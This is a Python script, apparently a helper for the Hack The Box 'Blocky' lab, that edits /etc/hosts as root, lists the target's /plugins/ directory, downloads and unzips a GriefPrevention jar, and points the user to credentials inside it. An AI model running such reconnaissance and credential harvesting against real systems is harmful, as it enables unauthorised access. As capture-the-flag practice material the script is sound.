import sys
import subprocess
from colorama import Fore, Style, init

init(autoreset=True)

HOSTS_FILE = "/etc/hosts"
HOSTADDR = "blocky.htb"
JAR_FILE = "griefprevention-1.11.2-3.1.1.298.jar"


if subprocess.run(
    ["id", "-u"], capture_output=True, text=True
).stdout.strip() != "0":
    print(Fore.RED + "[!]This script must be run with sudo")
    print(Fore.RED + "[!]sudo python cuteblocky.py")
    sys.exit(1)


ipaddr = input(Fore.BLUE + "[*]Blocky's IP Address: " + Style.RESET_ALL)

new_entry = f"{ipaddr} {HOSTADDR}\n"
updated = False

with open(HOSTS_FILE, "r") as f:
    lines = f.readlines()

new_lines = []

for line in lines:
    if HOSTADDR in line:
        if not updated:
            new_lines.append(new_entry)
            updated = True
    else:
        new_lines.append(line)

if not updated:
    new_lines.append(new_entry)
    print(Fore.GREEN + "[+]Added blocky.htb to /etc/hosts")
else:
    print(Fore.YELLOW + "[*]Updated blocky.htb IP in /etc/hosts")

with open(HOSTS_FILE, "w") as f:
    f.writelines(new_lines)



def run_curl(url):
    try:
        result = subprocess.run(
            ["curl", "-s", url],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout

    except subprocess.CalledProcessError as e:
        print(Fore.RED + "[!]curl failed")
        print(e.stderr)
        return None

    except FileNotFoundError:
        print(Fore.RED + "[!]curl is not installed")
        return None



def run_wget(url):
    try:
        result = subprocess.run(
            ["wget", url],
            capture_output=True,
            text=True,
            check=True
        )
        print(Fore.GREEN + "[+]File downloaded successfully")
        return result.stdout

    except subprocess.CalledProcessError as e:
        print(Fore.RED + "[!]wget failed")
        print(e.stderr)
        return None

    except FileNotFoundError:
        print(Fore.RED + "[!]wget is not installed")
        return None



def run_unzip(filename):
    try:
        result = subprocess.run(
            ["unzip", "-o", filename],
            capture_output=True,
            text=True,
            check=True
        )
        print(Fore.GREEN + "[+]Unzip completed successfully")
        return result.stdout

    except subprocess.CalledProcessError as e:
        print(Fore.RED + "[!]unzip failed")
        print(e.stderr)
        return None

    except FileNotFoundError:
        print(Fore.RED + "[!]unzip is not installed")
        return None



url = f"http://{HOSTADDR}/plugins/"
output = run_curl(url)

if output:
    print(Fore.BLUE + f"\n[+]Found Blocky Plugins Directory on {ipaddr}")
    print(output)
else:
    print(Fore.RED + "\n[!]No output returned from curl")
    sys.exit(1)

print(Fore.BLUE + f"\n[*]Getting {JAR_FILE} now")
download_url = f"http://{HOSTADDR}/plugins/files/{JAR_FILE}"

if run_wget(download_url) is None:
    sys.exit(1)

print(Fore.BLUE + f"\n[*] Unzipping {JAR_FILE}")

if run_unzip(JAR_FILE) is None:
    sys.exit(1)

print(Fore.GREEN + "\n[✓] Script completed successfully: Look in files for credentials")

